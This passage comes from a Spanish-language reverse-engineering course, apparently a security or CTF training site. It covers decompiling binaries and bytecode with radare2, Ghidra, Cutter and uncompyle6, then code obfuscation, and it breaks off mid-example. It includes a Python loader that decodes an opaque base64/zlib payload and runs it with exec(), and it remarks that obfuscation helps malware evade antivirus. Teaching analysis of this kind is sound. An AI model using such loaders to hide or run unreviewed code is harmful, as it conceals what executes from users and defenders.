override the default.\n    global _start\n\nsection .data\nmsg db  'Hello, world!',0xa ;our dear string\nlen equ $ - msg         ;length of our dear string\n\nsection .text\n\n; linker puts the entry point here:\n_start:\n\n; Write the string to stdout:\n\n    mov edx,len ;message length\n    mov ecx,msg ;message to write\n    mov ebx,1   ;file descriptor (stdout)\n    mov eax,4   ;system call number (sys_write)\n    int 0x80    ;call kernel\n\n; Exit via the kernel:\n\n    mov ebx,0   ;process' exit code\n    mov eax,1   ;system call number (sys_exit)\n    int 0x80    ;call kernel - this interrupt won't return\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ePueden encontrar documentación y un tutorial sobre Assembler\n\u003ca href=\"https://www.tutorialspoint.com/assembly_programming/index.htm\"\u003eaquí\u003c/a\u003e.\u003c/p\u003e\n"},{id:31,href:"/docs/reversa/decompiling/",title:"Decompilación",description:null,content:"\u003cp\u003eCon decompilación nos referiremos a la acción de tomar un programa compilado, ya sea a código binario o\nbytecode, y devolverlo a una forma legible para humanos. Esto puede ser código Assembler, o algo un poco\nmás sofisticado, como C, Java, Python, .Net, PHP, entre otros. Hacer esto de manera manual se puede volver prohibitivamente costoso\ny difícil, pero afortunadamente existen algunas herramientas que ayudan en el proceso, y muchas veces logran\nobtener un código casi idéntico al original. Esto claramente irá variando caso a caso, pero de todas formas\nanalizar un código en C poco legible, o incluso en Assembler, es mucho más fácil que hacerlo para\ncódigo binario.\u003c/p\u003e\n\u003ch2 id=\"decompilación-de-binarios\"\u003eDecompilación de Binarios\u003c/h2\u003e\n\u003cp\u003eLa decompilación de binarios puede tomar 2 formas:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eDecompilación Estática\u003c/strong\u003e: Toma como entrada el código binario y retorna uno o más archivos con código\ndecompilado. Esto sirve para analizar el código de manera estática, como también para realizar cambios al\ncódigo y ver cómo se comporta.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eDecompilación en Tiempo de Ejecución\u003c/strong\u003e: Se ejecuta el código de una forma especial, que permite ver las\ninstrucciones y datos utilizados durante la ejecución en formato Assembler. Funciona de manera similar a un\ndebugger, teniendo la capacidad de iterar por las instrucciones una a una y definir \u003cem\u003ebreak points\u003c/em\u003e.\nAdicionalmente, permite leer y modificar directamente los registros de la CPU y la memoria del proceso.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eLas herramientas más utilizadas son \u003ca href=\"https://ghidra-sre.org/\"\u003eGhidra\u003c/a\u003e para la decompilación estática, y\n\u003ca href=\"https://rada.re/n/radare2.html\"\u003eradare2\u003c/a\u003e para la decompilación en tiempo real.\u003c/p\u003e\n\u003cp\u003eA modo de ejemplo ocuparemos una implementación de Fibonacci en C, la cual la decompilaremos luego usando\nGhidra y radare2.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e#include \u0026lt;stdio.h\u0026gt;\n#include \u0026lt;stdlib.h\u0026gt;\n\nint fibonacci(int n) {\n        if (n == 1 || n == 2) {\n                return 1;\n        }\n        return fibonacci(n - 1) + fibonacci(n - 2);\n}\n\nvoid main(int argc, char *argv[]) {\n        int n = atoi(argv[1]);\n        int f = fibonacci(n);\n        printf(\u0026quot;%d\\n\u0026quot;, f);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eLa compilamos:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003egcc -o fibonacci fibonacci.c\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eY vemos que funciona como esperamos:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../c-exec.png\" alt=\"C Exec\"\u003e\u003c/p\u003e\n\u003ch3 id=\"radare2\"\u003eRadare2\u003c/h3\u003e\n\u003cp\u003eRadare2 nos permite ejecutar el código, y al mismo tiempo decompilarlo a Assembler. Este tiene muchas opciones\ny funcionalidades, y se puede volver bastante complejo de usar, por lo que es recomendable revisar la\n\u003ca href=\"https://book.rada.re/index.html\"\u003edocumentación\u003c/a\u003e y tutoriales como\n\u003ca href=\"https://www.megabeets.net/a-journey-into-radare-2-part-1/\"\u003eeste\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eEmpezaremos por lanzar radare2 en modo debug para analizar el ejecutable. Notar que es necesario entregarle\nun argumento a fibonacci, sino fallará. Una vez dentro de radare2, realizamos un análisis básico del binario.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../radare2-launch.png\" alt=\"Radare2 Launch\"\u003e\u003c/p\u003e\n\u003cp\u003eLuego, listamos las funciones definidas para entender mejor la estructura interna. Vemos 2 que nos podrían\ninteresar: \u003cem\u003emain\u003c/em\u003e y \u003cem\u003esym.fibonacci\u003c/em\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../radare2-functions.png\" alt=\"Radare2 Functions\"\u003e\u003c/p\u003e\n\u003cp\u003eDefinimos un \u003cem\u003ebreak point\u003c/em\u003e en la función \u003cem\u003emain\u003c/em\u003e y dejamos correr el proceso. Para ver el código decompilado\n(o desensamblado), ejecutamos \u003ccode\u003epdf\u003c/code\u003e (por Print Disassembled Function). Esto nos muestra 3 columnas:\nla dirección de memoria de la instrucción, la instrucción en hexadecimal, y la instrucción desensamblada\nen formato Assembler.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../radare2-main.png\" alt=\"Radare2 Main\"\u003e\u003c/p\u003e\n\u003cp\u003eObservamos que aparecen algunas cosas interesantes, como las llamadas a funciones y el string utilizado\npara formatear e imprimir el resultado. Ahora definimos un \u003cem\u003ebreak point\u003c/em\u003e en la dirección de memoria en donde\nse llama a la función \u003cem\u003esym.fibonacci\u003c/em\u003e, y continuamos con la ejecución.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../radare2-break.png\" alt=\"Radare2 Break\"\u003e\u003c/p\u003e\n\u003cp\u003ePara entrar a la función, ejecutamos solo una instrucción (la llamada a la función) usando el comando \u003ccode\u003eds\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../radare2-fibonacci.png\" alt=\"Radare2 Fibonacci\"\u003e\u003c/p\u003e\n\u003cp\u003eFinalmente, pueden ver un diagrama de flujos usando el comando \u003ccode\u003eVV\u003c/code\u003e. Esto les puede ayudar a entender\nlos distintos caminos de ejecución que puede tomar el proceso y qué sucede en cada uno.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../radare2-diagram.png\" alt=\"Radare2 Diagram\"\u003e\u003c/p\u003e\n\u003ch3 id=\"ghidra\"\u003eGhidra\u003c/h3\u003e\n\u003cp\u003ePara decompilar el ejecutable, primero abrimos Ghidra y creamos un proyecto cualquiera.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../ghidra-project.png\" alt=\"Ghidra Project\"\u003e\u003c/p\u003e\n\u003cp\u003eLuego hacemos click en la herramienta \u003cem\u003eCodeBrowser\u003c/em\u003e (En \u003cem\u003eTool Chest\u003c/em\u003e es el dragón verde) e importamos el archivo.\nDebería aparecer un popup preguntando si desean analizarlo, y dicen que sí. Aparecerá mucha información, más\nde la que se espera para un código tan simple. Esta corresponde a las librerías utilizadas (\u003cem\u003estdio\u003c/em\u003e y \u003cem\u003estdlib\u003c/em\u003e),\nal igual que algunas otras definiciones.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../ghidra-ui.png\" alt=\"Ghidra UI\"\u003e\u003c/p\u003e\n\u003cp\u003eA la izquierda está en panel de \u003cem\u003eSymbol Tree\u003c/em\u003e, con un dropdown llamado \u003cem\u003eFunctions\u003c/em\u003e. Si seleccionan la función\nfibonacci podrán ver el código decompilado de la función que definimos. Es bastante parecido al código\noriginal, pero se ven claras diferencias y es menos legible.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../ghidra-decompiled.png\" alt=\"Ghidra Decompiled\"\u003e\u003c/p\u003e\n\u003ch3 id=\"cutter\"\u003eCutter\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://cutter.re\"\u003eCutter\u003c/a\u003e es una herramienta \u003cem\u003eopen source\u003c/em\u003e similar a las anteriores pero con\nuna interfaz más moderna. Al ejecutar Cutter, vemos una ventana donde podemos\nseleccionar un tema y el idioma.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../cutter-welcome.png\" alt=\"Cutter Welcome\"\u003e\u003c/p\u003e\n\u003cp\u003eAl continuar, veremos una ventana donde podemos escoger un archivo.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../cutter-project.png\" alt=\"Cutter Project\"\u003e\u003c/p\u003e\n\u003cp\u003eUna vez se escoge un archivo, se abre el espacio de trabajo de Cutter. Lo primero que se ve\nes un resumen (\u0026ldquo;overview\u0026rdquo;) con información del archivo.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../cutter-overview.png\" alt=\"Cutter Overview\"\u003e\u003c/p\u003e\n\u003cp\u003eA la izquierda podemos ver una lista de funciones. Abajo, tenemos varias pestañas, con\nel disassembly, hexdump, decompilación, gráficos y otras visualizaciones más. Por ejemplo,\npodemos seleccionar la función \u003ccode\u003eloc.hex1\u003c/code\u003e y ver su diagrama en la pestaña \u003ccode\u003eGraph\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../cutter-graph.png\" alt=\"Cutter Graph\"\u003e\u003c/p\u003e\n\u003ch2 id=\"decompilación-de-bytecode\"\u003eDecompilación de Bytecode\u003c/h2\u003e\n\u003cp\u003eEl bytecode es una especie de código compilado, pero no a lenguaje de máquina, sino que a un lenguaje intermedio\npensado para ser ejecutado en un ambiente virtualizado. Luego, el bytecode es análogo a un lenguaje\nAssembler para la máquina virtual que lo corre.\nSe utiliza mucho para transformar lenguajes interpretados en algo un poco más eficiente de ejecutar,\npero sin tener que implementar un compilador completo.\nEste bytecode usualmente no difiere mucho del código original, y puede ser decompilado directamente,\ncasi sin alteraciones. Esto suele ser mucho más fácil de analizar que los binarios decompilados, ya que se\nobtiene inmediatamente código en un lenguaje de alto nivel.\u003c/p\u003e\n\u003ch3 id=\"java\"\u003eJava\u003c/h3\u003e\n\u003cp\u003eEn el caso de Java, el código se compila para ser ejecutado en la Java Virtual Machine (JVM).\nEl bytecode se encuentra en los archivos \u003ccode\u003e.class\u003c/code\u003e generados al hacer la compilación, los cuales también\npueden ser obtenidos desde un archivo empaquetado \u003ccode\u003e.jar\u003c/code\u003e. Estos pueden ser decompilados directamente\ncon \u003ca href=\"https://java-decompiler.github.io/\"\u003eJD-GUI\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eComo ejemplo crearemos un ejecutable \u003ccode\u003e.jar\u003c/code\u003e y realizaremos el proceso para decompilarlo. El código será un\nsimple Hello World en el archivo \u003ccode\u003eHelloWorld.java\u003c/code\u003e.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003epublic class HelloWorld {\n\tpublic static void main(String[] args) {\n\t\tSystem.out.println(\u0026quot;Hello World!\u0026quot;);\n\t}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eNecesitaremos un manifesto para crear el \u003ccode\u003e.jar\u003c/code\u003e correctamente. Para eso debemos tener el archivo\n\u003ccode\u003eMANIFEST.MF\u003c/code\u003e con el contenido:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eMain-Class: HelloWorld\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eLuego compilamos y empaquetamos el código:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../java-compiling.png\" alt=\"Java Compiling\"\u003e\u003c/p\u003e\n\u003cp\u003eAl ejecutar el archivo \u003ccode\u003eHelloWorld.jar\u003c/code\u003e verificamos que efectivamente hace lo que queremos:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../java-exec.png\" alt=\"Java Exec\"\u003e\u003c/p\u003e\n\u003cp\u003ePara decompilar el código simplemente abrimos el archivo \u003ccode\u003eHelloWorld.jar\u003c/code\u003e con el decompilador JD-GUI, lo que\nnos muestra un código Java casi idéntico al original.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../java-decompiled.png\" alt=\"Java Decompiled\"\u003e\u003c/p\u003e\n\u003ch3 id=\"python\"\u003ePython\u003c/h3\u003e\n\u003cp\u003eSi bien Python es un lenguaje interpretado, también tiene una forma compilada. Estos son los archivos \u003ccode\u003e.pyc\u003c/code\u003e\no \u003ccode\u003e.pyo\u003c/code\u003e que aparecen a veces dentro de \u003ccode\u003e__pycache__\u003c/code\u003e.\nPara decompilar el bytecode de Python, se puede utilizar librerías de Python:\n\u003ca href=\"https://github.com/rocky/python-decompile3\"\u003edecompyle3\u003c/a\u003e para Python3.7 en adelante\n(aún no hay soporte para Python3.9), y \u003ca href=\"https://pypi.org/project/uncompyle6/\"\u003euncompyle6\u003c/a\u003e\npara versiones anteriores. Se usan en la terminal de manera muy simple:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003edecompyle3 \u0026lt;archivo pyc o pyo\u0026gt;\nuncompyle6 \u0026lt;archivo pyc o pyo\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eComo ejemplo ocuparemos un script para calcular PI usando la fórmula de Leibniz y Python2.7.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003esys\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eLeibniz\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mf\"\u003e0.0\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ek\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mf\"\u003e1.0\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"nb\"\u003erange\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"n\"\u003ek\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e-=\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"n\"\u003ek\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ek\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esys\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n\u003cspan class=\"n\"\u003epi\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eLeibniz\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;PI = \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003epi\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eAl ejecutarlo vemos que nos retorna una aproximación de PI que depende del número de iteraciones que definamos.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../python-exec.png\" alt=\"Python Aprox\"\u003e\u003c/p\u003e\n\u003cp\u003eCompilamos el código a bytecode, el cual aparecerá en un nuevo archivo \u003ccode\u003epi.pyc\u003c/code\u003e.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003epython -m compileall pi.py\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eFinalmente decompilamos el archivo usando uncompyle6 y obtenemos un código casi exactamente igual al original:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../python-uncompiled.png\" alt=\"Python Uncompiled\"\u003e\u003c/p\u003e\n"},{id:32,href:"/docs/reversa/deobfuscation/",title:"Deobfuscación",description:null,content:"\u003cp\u003eLa deobfuscación de ejecutables es similar a la deobfuscación de JavaScript que vimos en los capítulos de\nesteganografía y aplicaciones web. La diferencia siendo que el código ahora puede estar compilado,\ny por lo tanto las operaciones utilizadas para obfuscar la funcionalidad podrían estar a nivel de microcódigo.\u003c/p\u003e\n\u003cp\u003eEste tipo de obfuscación no hace más seguras las aplicaciones, ya que con suficiente trabajo siempre pueden\nser deobfuscadas, sino que intenta dificultar la lectura y entendimiento de estas a personas que no tengan\nacceso al código fuente. Esto finalmente retrasa el hallazgo de diferentes tipos de vulnerabilidades, ya que\nimpone un trabajo previo a la investigación.\u003c/p\u003e\n\u003cp\u003eLa obfuscación suele usarse también para ocultar \u003cem\u003emalware\u003c/em\u003e y evitar que sea detectado por sistemas de antivirus.\nEstos funcionan mayoritariamente por la detección de firmas (\u003cem\u003esignatures\u003c/em\u003e) de virus y malware conocidos, que\nintentan identificarlos usando su ejecutable o comandos utilizados. La obfuscación puede cambiar la firma de un\nejecutable, y por lo tanto evadir la detección del antivirus.\u003c/p\u003e\n\u003ch2 id=\"obfuscación-básica\"\u003eObfuscación Básica\u003c/h2\u003e\n\u003cp\u003eLa obfuscación más básica, la cual solo es efectiva si el código original ya es relativamente complejo y extenso,\nes modificar los nombres de variables, funciones y clases por caracteres aleatorios, al igual que quitar\ntodo tipo de comentarios e información extra que pueda ayudar a alguien a comprender su significado.\nLuego, el código resultante no entrega ningún tipo de contexto sobre su funcionamiento, y este debe ser\nanalizado cuidadosamente para entenderlo.\u003c/p\u003e\n\u003cp\u003eComo ejemplo, tenemos este simple código en PHP que calcula la raíz cuadrada de un número usando el método de Newton.\nA pesar de ser un código muy breve y sin mucha complejidad, esta obfuscación ya impone algo de esfuerzo para\nentenderlo.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003ea0\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$f1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nv\"\u003e$c2\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$w3\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$f1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"k\"\u003efor\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$r4\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$r4\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$c2\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$r4\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$w3\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mf\"\u003e0.5\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$w3\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$f1\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nv\"\u003e$w3\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nv\"\u003e$w3\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$f1\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$b5\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$c2\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$b5\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$w3\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nx\"\u003ea0\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$f1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nv\"\u003e$c2\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"k\"\u003eecho\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e$w3\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"eval\"\u003eEval\u003c/h2\u003e\n\u003cp\u003eOtra forma simple de obfuscación, utilizada mayoritariamente en lenguajes interpretados\n(Python, PHP, JavaScript, etc) con la capacidad de evaluar código en tiempo de ejecución\n(también es posible para lenguajes compilados como C/C++, Java o VBA, pero suele ser algo más complejo),\nes el uso de codificación, compresión y encriptación (en cualquier orden y no necesariamente todos al mismo tiempo).\nEs decir, se toma el payload, o código que se quiera obfuscar,\nse codifica, comprime y encripta, y se almacena como un string o una constante en el código. Luego, al momento de\nejecutarlo, se debe desencriptar, descomprimir y decodificar, para finalmente evaluarlo (usando una función como\n\u003cem\u003eeval\u003c/em\u003e o \u003cem\u003eexec\u003c/em\u003e) en tiempo de ejecución.\u003c/p\u003e\n\u003cp\u003eComo ejemplo tenemos este pequeño código en Python. Pueden intentar decodificar ustedes mismos el payload.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003ebase64\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eb64decode\u003c/span\u003e\n\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003ezlib\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003edecompress\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;eJw1yzEKwkAQBdCr/ExlQPYC4gFsbNLaaHZwPyQza2YEc3ttbB+8vtHyIFd/eN2hn65zBrIppn43RsPFXm8Gk26DHNXqWW6bjKf+n4nqptg1SymYfNVstCcYiOSyYGXEDwYZv35UJm0=\u0026#39;\u003c/span\u003e\n\u003cspan class=\"n\"\u003edecoded\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eb64decode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003edecompressed\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003edecompress\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edecoded\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eexec\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edecompressed\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ePor sí solos estos métodos no son muy efectivos en contra de un humano (aunque sí contra muchos antivirus),\npues es muy evidente en dónde se está escondiendo el payload y cómo decodificarlo.\u003c/p\u003e\n\u003cp\u003ePara utilizar esta técnica con lenguajes compilados hay 2 opciones. La primera es pedirle al compilador que compile\nel código decodificado y luego ejecutar el archivo resultante. El problema es que muchas veces la llamada al\ncompilador marca al programa como posible malware y este se bloquea.\u003c/p\u003e\n\u003cp\u003eLa otra opción es tener el microcódigo compilado directamente almacenado en el código como payload. Luego, solo\nse necesita crear un archivo con este contenido o cambiar el contenido de memoria de un proceso por el\nmicrocódigo.\u003c/p\u003e\n\u003ch2 id=\"string-splitting\"\u003eString Splitting\u003c/h2\u003e\n\u003cp\u003eEl \u003cem\u003estring splitting\u003c/em\u003e, o separación de strings, es un método utilizado para esconder constantes de tipo string\n(como contraseñas, llaves privadas, URLs, mensajes, etc) en diversas partes.\nLuego, todas estas partes se mezclan de cierta forma en particular para producir la variable original.\nLas operaciones comúnmente utilizadas para esto son la concatenación, casting,\ncodificación en distintos estándares de texto, substrings, entre otros.\u003c/p\u003e\n\u003cp\u003ePor ejemplo, este código JavaScript esconde una contraseña obfuscada usando string splitting.\nNotar que no todas las secciones se utilizan para construir la contraseña.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-javascript\" data-lang=\"javascript\"\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003e_0xfb5e\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;\\x31\\x33\\x32\\x30\\x33\\x35\\x78\\x6b\\x4b\\x76\\x44\\x62\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;\\x38\\x4b\\x6e\\x7a\\x6b\\x74\\x6c\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;\\x31\\x30\\x30\\x30\\x38\\x45\\x79\\x6b\\x4d\\x68\\x69\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;\\x24\\x77\\x30\\x72\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;\\x31\\x38\\x38\\x32\\x33\\x34\\x6e\\x6b\\x73\\x41\\x55\\x6a\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan 